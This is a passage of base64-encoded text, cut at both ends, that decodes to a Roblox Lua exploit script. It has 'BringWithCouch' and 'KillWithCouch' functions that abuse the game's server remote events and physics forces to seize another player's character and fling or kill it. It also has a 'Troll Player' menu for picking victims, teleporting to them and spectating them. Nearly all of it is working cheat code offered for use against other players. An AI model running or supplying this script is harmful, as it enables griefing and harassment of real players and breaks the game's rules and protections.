OYW1lKQogICAgaWYgbm90IHRhcmdldCBvciBub3QgdGFyZ2V0LkNoYXJhY3RlciB0aGVuCiAgICAgICAgd2FybihFcnJvciBUYXJnZXQgcGxheWVyIG5vdCBmb3VuZCBvciBoYXMgbm8gY2hhcmFjdGVyKQogICAgICAgIHJldHVybgogICAgZW5kCgogICAgbG9jYWwgY2hhciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgaWYgbm90IGNoYXIgdGhlbgogICAgICAgIHdhcm4oRXJyb3IgTG9jYWwgcGxheWVyIGNoYXJhY3RlciBub3QgZm91bmQpCiAgICAgICAgcmV0dXJuCiAgICBlbmQKICAgIGxvY2FsIGh1bSA9IGNoYXJGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoSHVtYW5vaWQpCiAgICBsb2NhbCByb290ID0gY2hhckZpbmRGaXJzdENoaWxkKEh1bWFub2lkUm9vdFBhcnQpCiAgICBsb2NhbCB0Um9vdCA9IHRhcmdldC5DaGFyYWN0ZXIgYW5kIHRhcmdldC5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZChIdW1hbm9pZFJvb3RQYXJ0KQogICAgaWYgbm90IGh1bSBvciBub3Qgcm9vdCBvciBub3QgdFJvb3QgdGhlbgogICAgICAgIHdhcm4oRXJyb3IgUmVxdWlyZWQgY29tcG9uZW50cyBub3QgZm91bmQpCiAgICAgICAgcmV0dXJuCiAgICBlbmQKCiAgICBsb2NhbCBvcmlnaW5hbFBvcyA9IHJvb3QuUG9zaXRpb24gCiAgICBSZXBsaWNhdGVkU3RvcmFnZVdhaXRGb3JDaGlsZChSRSlXYWl0Rm9yQ2hpbGQoMUNsZWExclRvb2wxcylGaXJlU2VydmVyKENsZWFyQWxsVG9vbHMpCiAgICB0YXNrLndhaXQoMC4yKQoKICAgIFJlcGxpY2F0ZWRTdG9yYWdlLlJFRmluZEZpcnN0Q2hpbGQoMVRvbzFsKUludm9rZVNlcnZlcihQaWNraW5nVG9vbHMsIENvdWNoKQogICAgdGFzay53YWl0KDAuMykKCiAgICBsb2NhbCB0b29sID0gTG9jYWxQbGF5ZXIuQmFja3BhY2tGaW5kRmlyc3RDaGlsZChDb3VjaCkKICAgIGlmIHRvb2wgdGhlbgogICAgICAgIHRvb2wuUGFyZW50ID0gY2hhcgogICAgZW5kCiAgICB0YXNrLndhaXQoMC4xKQoKICAgIFZpcnR1YWxJbnB1dE1hbmFnZXJTZW5kS2V5RXZlbnQodHJ1ZSwgRW51bS5LZXlDb2RlLkYsIGZhbHNlLCBnYW1lKQogICAgdGFzay53YWl0KDAuMSkKCiAgICBodW1TZXRTdGF0ZUVuYWJsZWQoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5TZWF0ZWQsIGZhbHNlKQogICAgaHVtLlBsYXRmb3JtU3RhbmQgPSBmYWxzZQogICAgY2FtLkNhbWVyYVN1YmplY3QgPSB0YXJnZXQuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQoSGVhZCkgb3IgdFJvb3Qgb3IgaHVtCgogICAgbG9jYWwgYWxpZ24gPSBJbnN0YW5jZS5uZXcoQm9keVBvc2l0aW9uKQogICAgYWxpZ24uTmFtZSA9IEJyaW5nUG9zaXRpb24KICAgIGFsaWduLk1heEZvcmNlID0gVmVjdG9yMy5uZXcobWF0aC5odWdlLCBtYXRoLmh1Z2UsIG1hdGguaHVnZSkKICAgIGFsaWduLkQgPSAxMAogICAgYWxpZ24uUCA9IDMwMDAwCiAgICBhbGlnbi5Qb3NpdGlvbiA9IHJvb3QuUG9zaXRpb24KICAgIGFsaWduLlBhcmVudCA9IHRSb290CgogICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgYW5nbGUgPSAwCiAgICAgICAgbG9jYWwgc3RhcnRUaW1lID0gdGljaygpCiAgICAgICAgd2hpbGUgdGljaygpIC0gc3RhcnRUaW1lICA1IGFuZCB0YXJnZXQgYW5kIHRhcmdldC5DaGFyYWN0ZXIgYW5kIHRhcmdldC5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoSHVtYW5vaWQpIGRvCiAgICAgICAgICAgIGxvY2FsIHRIdW0gPSB0YXJnZXQuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGRPZkNsYXNzKEh1bWFub2lkKQogICAgICAgICAgICBpZiBub3QgdEh1bSBvciB0SHVtLlNpdCB0aGVuIGJyZWFrIGVuZAoKICAgICAgICAgICAgbG9jYWwgaHJwID0gdGFyZ2V0LkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0CiAgICAgICAgICAgIGxvY2FsIGFkanVzdGVkUG9zID0gaHJwLlBvc2l0aW9uICsgKGhycC5WZWxvY2l0eSAgMS41KQoKICAgICAgICAgICAgYW5nbGUgKz0gNTAKICAgICAgICAgICAgcm9vdC5DRnJhbWUgPSBDRnJhbWUubmV3KGFkanVzdGVkUG9zICsgVmVjdG9yMy5uZXcoMCwgMiwgMCkpICBDRnJhbWUuQW5nbGVzKG1hdGgucmFkKGFuZ2xlKSwgMCwgMCkKICAgICAgICAgICAgYWxpZ24uUG9zaXRpb24gPSByb290LlBvc2l0aW9uICsgVmVjdG9yMy5uZXcoMiwgMCwgMCkKCiAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgZW5kCgogICAgICAgIGFsaWduRGVzdHJveSgpCiAgICAgICAgaHVtU2V0U3RhdGVFbmFibGVkKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuU2VhdGVkLCB0cnVlKQogICAgICAgIGh1bS5QbGF0Zm9ybVN0YW5kID0gZmFsc2UKICAgICAgICBjYW0uQ2FtZXJhU3ViamVjdCA9IGh1bQoKICAgICAgICBmb3IgXywgcCBpbiBwYWlycyhjaGFyR2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgaWYgcElzQShCYXNlUGFydCkgdGhlbgogICAgICAgICAgICAgICAgcC5WZWxvY2l0eSA9IFZlY3RvcjMuemVybwogICAgICAgICAgICAgICAgcC5Sb3RWZWxvY2l0eSA9IFZlY3RvcjMuemVybwogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKCiAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICByb290LkFuY2hvcmVkID0gdHJ1ZQogICAgICAgIHJvb3QuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhvcmlnaW5hbFBvcykKICAgICAgICB0YXNrLndhaXQoMC4wMDEpCiAgICAgICAgcm9vdC5BbmNob3JlZCA9IGZhbHNlCgogICAgICAgIHRhc2sud2FpdCgwLjcpCiAgICAgICAgbG9jYWwgdG9vbCA9IGNoYXJGaW5kRmlyc3RDaGlsZChDb3VjaCkKICAgICAgICBpZiB0b29sIHRoZW4KICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBMb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgIGVuZAoKICAgICAgICB0YXNrLndhaXQoMC4wMDEpCiAgICAgICAgUmVwbGljYXRlZFN0b3JhZ2UuUkVGaW5kRmlyc3RDaGlsZCgxVG9vMWwpSW52b2tlU2VydmVyKFBpY2tpbmdUb29scywgQ291Y2gpCiAgICBlbmQpCmVuZAoKLS0gQnJpbmdXaXRoQ291Y2ggRnVuY3Rpb24KbG9jYWwgZnVuY3Rpb24gQnJpbmdXaXRoQ291Y2goKQogICAgbG9jYWwgdGFyZ2V0UGxheWVyID0gUGxheWVyc0ZpbmRGaXJzdENoaWxkKGdldGdlbnYoKS5UYXJnZXQpCiAgICBpZiBub3QgdGFyZ2V0UGxheWVyIHRoZW4KICAgICAgICB3YXJuKEVycm9yIE5vIHRhcmdldCBwbGF5ZXIgc2VsZWN0ZWQpCiAgICAgICAgcmV0dXJuCiAgICBlbmQKICAgIGlmIG5vdCB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyIG9yIG5vdCB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQoSHVtYW5vaWRSb290UGFydCkgdGhlbgogICAgICAgIHdhcm4oRXJyb3IgVGFyZ2V0IHBsYXllciBoYXMgbm8gY2hhcmFjdGVyIG9yIEh1bWFub2lkUm9vdFBhcnQpCiAgICAgICAgcmV0dXJuCiAgICBlbmQKCiAgICBsb2NhbCBhcmdzID0geyBbMV0gPSBDbGVhckFsbFRvb2xzIH0KICAgIFJlcGxpY2F0ZWRTdG9yYWdlLlJFWzFDbGVhMXJUb29sMXNdRmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICBsb2NhbCBhcmdzID0geyBbMV0gPSBQaWNraW5nVG9vbHMsIFsyXSA9IENvdWNoIH0KICAgIFJlcGxpY2F0ZWRTdG9yYWdlLlJFRmluZEZpcnN0Q2hpbGQoMVRvbzFsKUludm9rZVNlcnZlcih1bnBhY2soYXJncykpCgogICAgbG9jYWwgY291Y2ggPSBMb2NhbFBsYXllci5CYWNrcGFja1dhaXRGb3JDaGlsZChDb3VjaCwgMikKICAgIGlmIG5vdCBjb3VjaCB0aGVuCiAgICAgICAgd2FybihFcnJvciBDb3VjaCBub3QgZm91bmQgaW4gQmFja3BhY2spCiAgICAgICAgcmV0dXJuCiAgICBlbmQKCiAgICBjb3VjaC5OYW1lID0gQ2hhb3MuQ291Y2gKICAgIGxvY2FsIHNlYXQxID0gY291Y2hGaW5kRmlyc3RDaGlsZChTZWF0MSkKICAgIGxvY2FsIHNlYXQyID0gY291Y2hGaW5kRmlyc3RDaGlsZChTZWF0MikKICAgIGxvY2FsIGhhbmRsZSA9IGNvdWNoRmluZEZpcnN0Q2hpbGQoSGFuZGxlKQogICAgaWYgc2VhdDEgYW5kIHNlYXQyIGFuZCBoYW5kbGUgdGhlbgogICAgICAgIHNlYXQxLkRpc2FibGVkID0gdHJ1ZQogICAgICAgIHNlYXQyLkRpc2FibGVkID0gdHJ1ZQogICAgICAgIGhhbmRsZS5OYW1lID0gSGFuZGxlIAogICAgZWxzZQogICAgICAgIHdhcm4oRXJyb3IgQ291Y2ggY29tcG9uZW50cyBub3QgZm91bmQpCiAgICAgICAgcmV0dXJuCiAgICBlbmQKICAgIGNvdWNoLlBhcmVudCA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgoKICAgIGxvY2FsIHRldCA9IEluc3RhbmNlLm5ldyhCb2R5VmVsb2NpdHksIHNlYXQxKQogICAgdGV0Lk1heEZvcmNlID0gVmVjdG9yMy5uZXcobWF0aC5odWdlLCBtYXRoLmh1Z2UsIG1hdGguaHVnZSkKICAgIHRldC5QID0gMTI1MAogICAgdGV0LlZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoMCwgMCwgMCkKICAgIHRldC5OYW1lID0gI21PVk9PRVBGJCNARiQjR0VSRS4uVkVXVlcKCiAgICByZXBlYXQKICAgICAgICBmb3IgbSA9IDEsIDM1IGRvCiAgICAgICAgICAgIGxvY2FsIHBvcyA9IHsgeCA9IDAsIHkgPSAwLCB6ID0gMCB9CiAgICAgICAgICAgIGxvY2FsIHRSb290ID0gdGFyZ2V0UGxheWVyLkNoYXJhY3RlciBhbmQgdGFyZ2V0UGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0CiAgICAgICAgICAgIGlmIG5vdCB0Um9vdCB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICBwb3MueCA9IHRSb290LlBvc2l0aW9uLlggKyAodFJvb3QuVmVsb2NpdHkuWCAgMikKICAgICAgICAgICAgcG9zLnkgPSB0Um9vdC5Qb3NpdGlvbi5ZICsgKHRSb290LlZlbG9jaXR5LlkgIDIpCiAgICAgICAgICAgIHBvcy56ID0gdFJvb3QuUG9zaXRpb24uWiArICh0Um9vdC5WZWxvY2l0eS5aICAyKQogICAgICAgICAgICBzZWF0MS5DRnJhbWUgPSBDRnJhbWUubmV3KFZlY3RvcjMubmV3KHBvcy54LCBwb3MueSwgcG9zLnopKSAgQ0ZyYW1lLm5ldygtMiwgMiwgMCkKICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICBlbmQKICAgICAgICB0ZXREZXN0cm95KCkKICAgICAgICBjb3VjaC5QYXJlbnQgPSBMb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgY291Y2hGaW5kRmlyc3RDaGlsZChIYW5kbGUgKS5OYW1lID0gSGFuZGxlCiAgICAgICAgdGFzay53YWl0KDAuMikKICAgICAgICBjb3VjaC5QYXJlbnQgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICB0YXNrLndhaXQoKQogICAgICAgIGNvdWNoLlBhcmVudCA9IExvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgY291Y2guSGFuZGxlLk5hbWUgPSBIYW5kbGUgCiAgICAgICAgdGFzay53YWl0KDAuMikKICAgICAgICBjb3VjaC5QYXJlbnQgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICB0ZXQgPSBJbnN0YW5jZS5uZXcoQm9keVZlbG9jaXR5LCBzZWF0MSkKICAgICAgICB0ZXQuTWF4Rm9yY2UgPSBWZWN0b3IzLm5ldyhtYXRoLmh1Z2UsIG1hdGguaHVnZSwgbWF0aC5odWdlKQogICAgICAgIHRldC5QID0gMTI1MAogICAgICAgIHRldC5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDAsIDAsIDApCiAgICAgICAgdGV0Lk5hbWUgPSAjbU9WT09FUEYkI0BGJCNHRVJFLi5WRVdWVwogICAgdW50aWwgdGFyZ2V0UGxheWVyLkNoYXJhY3RlciBhbmQgdGFyZ2V0UGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZCBhbmQgdGFyZ2V0UGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgPT0gdHJ1ZQogICAgdGFzay53YWl0KCkKICAgIHRldERlc3Ryb3koKQogICAgY291Y2guUGFyZW50ID0gTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgIHRhc2sud2FpdCgpCiAgICBjb3VjaEZpbmRGaXJzdENoaWxkKEhhbmRsZSApLk5hbWUgPSBIYW5kbGUKICAgIHRhc2sud2FpdCgwLjMpCiAgICBjb3VjaC5QYXJlbnQgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgIHRhc2sud2FpdCgwLjMpCiAgICBjb3VjaC5HcmlwID0gQ0ZyYW1lLm5ldyhWZWN0b3IzLm5ldygwLCAwLCAwKSkKICAgIHRhc2sud2FpdCgwLjMpCiAgICBSZXBsaWNhdGVkU3RvcmFnZS5SRVsxQ2xlYTFyVG9vbDFzXUZpcmVTZXJ2ZXIoQ2xlYXJBbGxUb29scykKZW5kCgotLSBLaWxsV2l0aENvdWNoIEZ1bmN0aW9uCmxvY2FsIGZ1bmN0aW9uIEtpbGxXaXRoQ291Y2goKQogICAgbG9jYWwgdGFyZ2V0UGxheWVyID0gUGxheWVyc0ZpbmRGaXJzdENoaWxkKGdldGdlbnYoKS5UYXJnZXQpCiAgICBpZiBub3QgdGFyZ2V0UGxheWVyIHRoZW4KICAgICAgICB3YXJuKEVycm9yIE5vIHRhcmdldCBwbGF5ZXIgc2VsZWN0ZWQpCiAgICAgICAgcmV0dXJuCiAgICBlbmQKICAgIGlmIG5vdCB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyIG9yIG5vdCB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQoSHVtYW5vaWRSb290UGFydCkgdGhlbgogICAgICAgIHdhcm4oRXJyb3IgVGFyZ2V0IHBsYXllciBoYXMgbm8gY2hhcmFjdGVyIG9yIEh1bWFub2lkUm9vdFBhcnQpCiAgICAgICAgcmV0dXJuCiAgICBlbmQKCiAgICBsb2NhbCBhcmdzID0geyBbMV0gPSBDbGVhckFsbFRvb2xzIH0KICAgIFJlcGxpY2F0ZWRTdG9yYWdlLlJFWzFDbGVhMXJUb29sMXNdRmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICBsb2NhbCBhcmdzID0geyBbMV0gPSBQaWNraW5nVG9vbHMsIFsyXSA9IENvdWNoIH0KICAgIFJlcGxpY2F0ZWRTdG9yYWdlLlJFRmluZEZpcnN0Q2hpbGQoMVRvbzFsKUludm9rZVNlcnZlcih1bnBhY2soYXJncykpCgogICAgbG9jYWwgY291Y2ggPSBMb2NhbFBsYXllci5CYWNrcGFja1dhaXRGb3JDaGlsZChDb3VjaCwgMikKICAgIGlmIG5vdCBjb3VjaCB0aGVuCiAgICAgICAgd2FybihFcnJvciBDb3VjaCBub3QgZm91bmQgaW4gQmFja3BhY2spCiAgICAgICAgcmV0dXJuCiAgICBlbmQKCiAgICBjb3VjaC5OYW1lID0gQ2hhb3MuQ291Y2gKICAgIGxvY2FsIHNlYXQxID0gY291Y2hGaW5kRmlyc3RDaGlsZChTZWF0MSkKICAgIGxvY2FsIHNlYXQyID0gY291Y2hGaW5kRmlyc3RDaGlsZChTZWF0MikKICAgIGxvY2FsIGhhbmRsZSA9IGNvdWNoRmluZEZpcnN0Q2hpbGQoSGFuZGxlKQogICAgaWYgc2VhdDEgYW5kIHNlYXQyIGFuZCBoYW5kbGUgdGhlbgogICAgICAgIHNlYXQxLkRpc2FibGVkID0gdHJ1ZQogICAgICAgIHNlYXQyLkRpc2FibGVkID0gdHJ1ZQogICAgICAgIGhhbmRsZS5OYW1lID0gSGFuZGxlIAogICAgZWxzZQogICAgICAgIHdhcm4oRXJyb3IgQ291Y2ggY29tcG9uZW50cyBub3QgZm91bmQpCiAgICAgICAgcmV0dXJuCiAgICBlbmQKICAgIGNvdWNoLlBhcmVudCA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgoKICAgIGxvY2FsIHRldCA9IEluc3RhbmNlLm5ldyhCb2R5VmVsb2NpdHksIHNlYXQxKQogICAgdGV0Lk1heEZvcmNlID0gVmVjdG9yMy5uZXcobWF0aC5odWdlLCBtYXRoLmh1Z2UsIG1hdGguaHVnZSkKICAgIHRldC5QID0gMTI1MAogICAgdGV0LlZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoMCwgMCwgMCkKICAgIHRldC5OYW1lID0gI21PVk9PRVBGJCNARiQjR0VSRS4uVkVXVlcKCiAgICByZXBlYXQKICAgICAgICBmb3IgbSA9IDEsIDM1IGRvCiAgICAgICAgICAgIGxvY2FsIHBvcyA9IHsgeCA9IDAsIHkgPSAwLCB6ID0gMCB9CiAgICAgICAgICAgIGxvY2FsIHRSb290ID0gdGFyZ2V0UGxheWVyLkNoYXJhY3RlciBhbmQgdGFyZ2V0UGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0CiAgICAgICAgICAgIGlmIG5vdCB0Um9vdCB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICBwb3MueCA9IHRSb290LlBvc2l0aW9uLlggKyAodFJvb3QuVmVsb2NpdHkuWCAgMikKICAgICAgICAgICAgcG9zLnkgPSB0Um9vdC5Qb3NpdGlvbi5ZICsgKHRSb290LlZlbG9jaXR5LlkgIDIpCiAgICAgICAgICAgIHBvcy56ID0gdFJvb3QuUG9zaXRpb24uWiArICh0Um9vdC5WZWxvY2l0eS5aICAyKQogICAgICAgICAgICBzZWF0MS5DRnJhbWUgPSBDRnJhbWUubmV3KFZlY3RvcjMubmV3KHBvcy54LCBwb3MueSwgcG9zLnopKSAgQ0ZyYW1lLm5ldygtMiwgMiwgMCkKICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICBlbmQKICAgICAgICB0ZXREZXN0cm95KCkKICAgICAgICBjb3VjaC5QYXJlbnQgPSBMb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgY291Y2hGaW5kRmlyc3RDaGlsZChIYW5kbGUgKS5OYW1lID0gSGFuZGxlCiAgICAgICAgdGFzay53YWl0KDAuMikKICAgICAgICBjb3VjaC5QYXJlbnQgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICB0YXNrLndhaXQoKQogICAgICAgIGNvdWNoLlBhcmVudCA9IExvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgY291Y2guSGFuZGxlLk5hbWUgPSBIYW5kbGUgCiAgICAgICAgdGFzay53YWl0KDAuMikKICAgICAgICBjb3VjaC5QYXJlbnQgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICB0ZXQgPSBJbnN0YW5jZS5uZXcoQm9keVZlbG9jaXR5LCBzZWF0MSkKICAgICAgICB0ZXQuTWF4Rm9yY2UgPSBWZWN0b3IzLm5ldyhtYXRoLmh1Z2UsIG1hdGguaHVnZSwgbWF0aC5odWdlKQogICAgICAgIHRldC5QID0gMTI1MAogICAgICAgIHRldC5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDAsIDAsIDApCiAgICAgICAgdGV0Lk5hbWUgPSAjbU9WT09FUEYkI0BGJCNHRVJFLi5WRVdWVwogICAgdW50aWwgdGFyZ2V0UGxheWVyLkNoYXJhY3RlciBhbmQgdGFyZ2V0UGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZCBhbmQgdGFyZ2V0UGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgPT0gdHJ1ZQogICAgdGFzay53YWl0KCkKICAgIGNvdWNoLlBhcmVudCA9IExvY2FsUGxheWVyLkJhY2twYWNrCiAgICBzZWF0MS5DRnJhbWUgPSBDRnJhbWUubmV3KDk5OTksIC00NTAsIDk5OTkpCiAgICBzZWF0Mi5DRnJhbWUgPSBDRnJhbWUubmV3KDk5OTksIC00NTAsIDk5OTkpCiAgICBjb3VjaC5QYXJlbnQgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgIHRhc2sud2FpdCgwLjEpCiAgICBjb3VjaC5QYXJlbnQgPSBMb2NhbFBsYXllci5CYWNrcGFjawogICAgdGFzay53YWl0KDIpCiAgICBsb2NhbCBidiA9IHNlYXQxRmluZEZpcnN0Q2hpbGQoI21PVk9PRVBGJCNARiQjR0VSRS4uVkVXVlcpCiAgICBpZiBidiB0aGVuIGJ2RGVzdHJveSgpIGVuZAogICAgUmVwbGljYXRlZFN0b3JhZ2UuUkVbMUNsZWExclRvb2wxc11GaXJlU2VydmVyKENsZWFyQWxsVG9vbHMpCmVuZAogICAgbG9jYWwgUGxheWVyU2VjdGlvbiA9IFRyb2xsQWRkU2VjdGlvbih7IE5hbWUgPSBUcm9sbCBQbGF5ZXIgfSkKCiAgICAtLSBGdW5jdGlvbiB0byBnZXQgbGlzdCBvZiBwbGF5ZXJzCiAgICBsb2NhbCBmdW5jdGlvbiBnZXRQbGF5ZXJMaXN0KCkKICAgICAgICBsb2NhbCBwbGF5ZXJzID0gUGxheWVyc0dldFBsYXllcnMoKQogICAgICAgIGxvY2FsIHBsYXllck5hbWVzID0ge30KICAgICAgICBmb3IgXywgcGxheWVyIGluIGlwYWlycyhwbGF5ZXJzKSBkbwogICAgICAgICAgICBpZiBwbGF5ZXIgfj0gTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgICAgICAgICAgdGFibGUuaW5zZXJ0KHBsYXllck5hbWVzLCBwbGF5ZXIuTmFtZSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgcmV0dXJuIHBsYXllck5hbWVzCiAgICBlbmQKCiAgICBsb2NhbCBraWxsRHJvcGRvd24gPSBUcm9sbEFkZERyb3Bkb3duKHsKICAgICAgICBOYW1lID0gU2VsZWN0IFBsYXllciwKICAgICAgICBPcHRpb25zID0gZ2V0UGxheWVyTGlzdCgpLAogICAgICAgIERlZmF1bHQgPSAsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2YWx1ZSkKICAgICAgICAgICAgc2VsZWN0ZWRQbGF5ZXJOYW1lID0gdmFsdWUKICAgICAgICAgICAgZ2V0Z2VudigpLlRhcmdldCA9IHZhbHVlCiAgICAgICAgICAgIHByaW50KFNlbGVjdGVkIHBsYXllciAgLi4gdG9zdHJpbmcodmFsdWUpKQogICAgICAgIGVuZAogICAgfSkKCiAgICBUcm9sbEFkZEJ1dHRvbih7CiAgICAgICAgTmFtZSA9IFJlZnJlc2ggUGxheWVyIExpc3QsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgICAgIGxvY2FsIHRhYmxlUGxheWVycyA9IFBsYXllcnNHZXRQbGF5ZXJzKCkKICAgICAgICAgICAgbG9jYWwgbmV3UGxheWVycyA9IHt9CiAgICAgICAgICAgIGlmIGtpbGxEcm9wZG93biBhbmQgI3RhYmxlUGxheWVycyAgMCB0aGVuCiAgICAgICAgICAgICAgICBmb3IgXywgcGxheWVyIGluIGlwYWlycyh0YWJsZVBsYXllcnMpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgcGxheWVyLk5hbWUgfj0gTG9jYWxQbGF5ZXIuTmFtZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChuZXdQbGF5ZXJzLCBwbGF5ZXIuTmFtZSkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAga2lsbERyb3Bkb3duU2V0KG5ld1BsYXllcnMpCiAgICAgICAgICAgICAgICBwcmludChQbGF5ZXIgbGlzdCB1cGRhdGVkICwgdGFibGUuY29uY2F0KG5ld1BsYXllcnMsICwgKSkKICAgICAgICAgICAgICAgIGlmIHNlbGVjdGVkUGxheWVyTmFtZSBhbmQgbm90IFBsYXllcnNGaW5kRmlyc3RDaGlsZChzZWxlY3RlZFBsYXllck5hbWUpIHRoZW4KICAgICAgICAgICAgICAgICAgICBzZWxlY3RlZFBsYXllck5hbWUgPSBuaWwKICAgICAgICAgICAgICAgICAgICBnZXRnZW52KCkuVGFyZ2V0ID0gbmlsCiAgICAgICAgICAgICAgICAgICAga2lsbERyb3Bkb3duU2V0VmFsdWUoKQogICAgICAgICAgICAgICAgICAgIHByaW50KFNlbGVjdGlvbiByZXNldCwgcGxheWVyIGlzIG5vIGxvbmdlciBpbiB0aGUgc2VydmVyLikKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBwcmludChFcnJvciBEcm9wZG93biBub3QgZm91bmQgb3Igbm8gcGxheWVycyBhdmFpbGFibGUuKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIH0pCgogICAgVHJvbGxBZGRCdXR0b24oewogICAgICAgIE5hbWUgPSBUZWxlcG9ydCB0byBQbGF5ZXIsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIG5vdCBzZWxlY3RlZFBsYXllck5hbWUgb3Igbm90IFBsYXllcnNGaW5kRmlyc3RDaGlsZChzZWxlY3RlZFBsYXllck5hbWUpIHRoZW4KICAgICAgICAgICAgICAgIHByaW50KEVycm9yIFBsYXllciBub3Qgc2VsZWN0ZWQgb3IgZG9lcyBub3QgZXhpc3QpCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICBsb2NhbCBodW1hbm9pZFJvb3RQYXJ0ID0gY2hhcmFjdGVyIGFuZCBjaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZChIdW1hbm9pZFJvb3RQYXJ0KQogICAgICAgICAgICBpZiBub3QgaHVtYW5vaWRSb290UGFydCB0aGVuCiAgICAgICAgICAgICAgICB3YXJuKEVycm9yIExvY2FsIHBsYXllcidzIEh1bWFub2lkUm9vdFBhcnQgbm90IGZvdW5kKQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgbG9jYWwgdGFyZ2V0UGxheWVyID0gUGxheWVyc0ZpbmRGaXJzdENoaWxkKHNlbGVjdGVkUGxheWVyTmFtZSkKICAgICAgICAgICAgaWYgdGFyZ2V0UGxheWVyIGFuZCB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyIGFuZCB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQoSHVtYW5vaWRSb290UGFydCkgdGhlbgogICAgICAgICAgICAgICAgaHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHByaW50KEVycm9yIFRhcmdldCBwbGF5ZXIgbm90IGZvdW5kIG9yIGhhcyBubyBIdW1hbm9pZFJvb3RQYXJ0KQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIH0pCgogICAgVHJvbGxBZGRUb2dnbGUoewogICAgICAgIE5hbWUgPSBTcGVjdGF0ZSBQbGF5ZXIsCiAgICAgICAgRGVmYXVsdCA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgICAgIGxvY2FsIENhbWVyYSA9IHdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhCgogICAgICAgICAgICBsb2NhbCBmdW5jdGlvbiBVcGRhdGVDYW1lcmEoKQogICAgICAgICAgICAgICAgaWYgdmFsdWUgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldFBsYXllciA9IFBsYXllcnNGaW5kRmlyc3RDaGlsZChzZWxlY3RlZFBsYXllck5hbWUpCiAgICAgICAgICAgICAgICAgICAgaWYgdGFyZ2V0UGxheWVyIGF